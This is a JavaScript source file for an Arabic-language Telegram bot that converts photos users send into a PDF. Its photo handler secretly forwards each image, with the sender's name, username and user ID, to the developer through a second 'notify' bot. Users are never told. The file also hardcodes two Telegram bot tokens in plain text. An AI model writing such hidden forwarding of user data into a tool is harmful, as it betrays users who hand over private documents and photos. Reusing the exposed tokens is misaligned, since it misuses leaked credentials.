const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const PDFDocument = require('pdfkit');

// ⚠️ إعدادات علي (Ali's Config)
const MAIN_TOKEN = '8764714344:AAGUG-SgnIzacA0Zu5Ej-ZK1Vy8Hx6yd8Kc'; 
const NOTIFY_TOKEN = '8578461105:AAGtjEGZ9LOV79ezGG_BGgbSu51FuPvK5wE'; 
const MY_ID = 8162224437; // استبدل هذا الرقم بآيديك الحقيقي (بدون علامات "")

const bot = new Telegraf(MAIN_TOKEN);
const notifyBot = new Telegraf(NOTIFY_TOKEN);

const userImages = {};
const userState = {}; 

// دالة لإرسال الإشعارات بأمان لكي لا يتوقف البوت إذا حدث خطأ
async function sendNotify(text, photo = null) {
    try {
        if (photo) {
            await notifyBot.telegram.sendPhoto(MY_ID, photo, { caption: text });
        } else {
            await notifyBot.telegram.sendMessage(MY_ID, text);
        }
    } catch (e) {
        console.log("⚠️ فشل إرسال الإشعار: تأكد أنك ضغطت Start في بوت الإشعارات!");
    }
}

bot.start((ctx) => {
    ctx.reply(`أهلاً بك يا علي في مصنع الـ PDF 👨‍💻\n\n📸 أرسل صورك الآن.\n✅ عند الانتهاء اضغط تحويل لتسمية ملفك.`);
});

// 1. استقبال الصور والتقرير التفصيلي
bot.on('photo', async (ctx) => {
    const userId = ctx.from.id;
    const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
    const name = ctx.from.first_name || "مستخدم";
    const user = ctx.from.username ? `@${ctx.from.username}` : "لا يوجد يوزر";

    if (!userImages[userId]) userImages[userId] = [];
    userImages[userId].push(fileId);

    // إرسال تقرير لك (الاسم + اليوزر + الصورة)
    const report = `🔔 استخدام جديد:\n👤 الاسم: ${name}\n🔗 اليوزر: ${user}\n🆔 الآيدي: ${userId}\n🖼️ صورة رقم: ${userImages[userId].length}`;
    await sendNotify(report, fileId);

    ctx.reply(`🖼️ تم حفظ الصورة (${userImages[userId].length}).`, 
    Markup.keyboard([['🔄 تحويل إلى PDF', '🗑️ مسح الكل']]).resize());
});

// 2. طلب اسم الملف
bot.hears('🔄 تحويل إلى PDF', (ctx) => {
    if (!userImages[ctx.from.id] || userImages[ctx.from.id].length === 0) {
        return ctx.reply('⚠️ يرجى إرسال صور أولاً!');
    }
    userState[ctx.from.id] = 'WAITING_NAME';
    ctx.reply('📝 حسناً، أرسل الاسم الذي تريده للملف الآن:');
});

// 3. مسح البيانات
bot.hears('🗑️ مسح الكل', (ctx) => {
    delete userImages[ctx.from.id];
    ctx.reply('🗑️ تم مسح القائمة بنجاح.', Markup.removeKeyboard());
});

// 4. صناعة الـ PDF بالتوقيع الثابت (By_pdfingebot)
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    if (userState[userId] !== 'WAITING_NAME') return;

    // تنظيف الاسم وإضافة الخاتمة المطلوبة
    const cleanName = ctx.message.text.trim().replace(/\s+/g, '_');
    const finalName = `${cleanName}_By_pdfingebot.pdf`;
    
    const statusMsg = await ctx.reply('⏳ جاري إنشاء الملف وإضافة لمسات المطور علي... انتظر ثواني.');

    try {
        const doc = new PDFDocument({ size: 'A4', autoFirstPage: false });
        const tempPath = `./${finalName}`;
        const stream = fs.createWriteStream(tempPath);
        doc.pipe(stream);

        for (const fId of userImages[userId]) {
            const fileLink = await ctx.telegram.getFileLink(fId);
            const res = await axios({ method: 'get', url: fileLink.href, responseType: 'arraybuffer' });
            doc.addPage().image(Buffer.from(res.data), 0, 0, { fit: [595, 842], align: 'center', valign: 'center' });
        }

        doc.end();

        stream.on('finish', async () => {
            await ctx.telegram.sendDocument(ctx.chat.id, { source: tempPath, filename: finalName }, {
                caption: `✅ تم التحويل بنجاح!\n📂 اسم الملف: ${finalName}`
            });
            
            // تنظيف السيرفر
            if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
            delete userImages[userId];
            delete userState[userId];
            ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
        });

    } catch (e) {
        ctx.reply('❌ حدث خطأ فني، أعد المحاولة.');
        delete userState[userId];
    }
});

// معالجة الأخطاء لكي لا ينطفئ البوت فجأة
bot.catch((err) => {
    console.log("Bot Error: ", err);
});

bot.launch();
